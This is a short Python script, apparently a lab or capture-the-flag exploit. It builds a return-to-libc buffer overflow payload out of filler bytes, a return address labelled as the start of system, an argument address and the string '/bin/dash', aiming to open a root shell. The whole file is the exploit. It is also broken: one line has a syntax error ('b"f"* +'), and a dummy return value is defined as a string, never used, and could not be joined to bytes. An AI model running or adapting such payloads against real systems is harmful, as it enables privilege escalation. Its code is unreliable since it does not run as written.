import sys
from struct import pack

#Need to run /bin/sh and open a root shell
filler = b"D"*22
ret= 0x0804ef50.to_bytes(4, "little")#start of systemx
dummy_ret = "f"*4
arg= 0xbffefaa8.to_bytes(4, "little") #wherever shell code string is
command = b"/bin/dash"

sys.stdout.buffer.write(filler + ret+ b"f"* + arg+ command)